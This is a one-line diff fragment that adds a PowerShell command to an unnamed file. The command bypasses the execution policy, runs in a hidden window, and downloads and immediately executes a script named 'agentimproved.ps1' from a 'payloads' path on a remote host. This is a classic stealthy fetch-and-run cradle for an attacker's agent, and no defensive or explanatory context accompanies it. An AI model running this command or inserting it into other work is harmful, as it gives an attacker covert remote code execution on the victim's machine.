@@ -1,0 +1,1 @@
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iwr http://192.168.209.164:8084/payloads/agentimproved.ps1 -UseBasicParsing | iex"
